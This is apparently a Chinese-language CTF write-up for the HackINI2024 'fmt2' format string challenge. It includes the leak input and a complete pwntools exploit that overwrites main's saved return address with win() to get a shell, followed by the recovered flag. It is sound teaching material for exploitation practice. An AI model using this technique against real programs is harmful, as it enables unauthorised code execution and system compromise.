# HackINI2024 fmt2

## 题目简述

第二道格式字符串题不再把 flag 放在栈上，而是提供一个执行 `/bin/sh` 的 `win()`。程序启用了 PIE，保存返回地址也位于随机化的栈上，因此需要先通过格式字符串泄露栈地址和 PIE 地址，再利用 `%n` 系列写入原语把返回地址改为 `win()`。

## 解题过程

程序循环执行 `printf(buf)`，输入 `exit` 后跳出循环并从 `main()` 返回。附件二进制对应的关键位置为：

```text
栈地址泄露位置：%21$p
PIE 地址泄露位置：%19$p
可控格式串参数偏移：6
泄露栈地址到 main 返回地址的差值：0x110
PIE 泄露值对应 main 的运行时地址
```

因此先发送：

```text
%21$p,%19$p|
```

计算目标地址：

$$
\text{return\_slot}=\text{stack\_leak}-0x110
$$

$$
\text{PIE\_base}=\text{pie\_leak}-\operatorname{offset}(main)
$$

再借助 Pwntools 生成短写 payload，将 `win()` 的运行时地址写入保存返回地址：

```python
from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
io = process(elf.path)
io.recvline()

io.sendlineafter(b"> ", b"%21$p,%19$p|")
stack_leak, pie_leak = map(
    lambda value: int(value, 16),
    io.recvuntil(b"|", drop=True).split(b","),
)

return_slot = stack_leak - 0x110
elf.address = pie_leak - elf.sym.main

payload = fmtstr_payload(
    6,
    {return_slot: elf.sym.win},
    write_size="short",
)
assert len(payload) < 0x50
io.sendlineafter(b"> ", payload)
io.sendlineafter(b"> ", b"exit")

io.sendline(b"cat flag.txt")
print(io.recvline().decode().strip())
```

`main()` 返回时进入 `win()` 并启动 shell，最终得到：

```text
shellmates{YOu_cAn_d0_$o_much_W1Th_fORMAT_$Tr1ng$}
```

## 方法总结

开启 PIE 后，写入目标和被写目标都必须先由泄露值恢复。第一阶段用位置参数读取栈和代码地址，第二阶段利用 `%n` 写入返回地址，最后主动触发函数返回。偏移 21、19、6 和 `0x110` 都是附件二进制的实测值，不应脱离具体构建机械套用到其他程序。
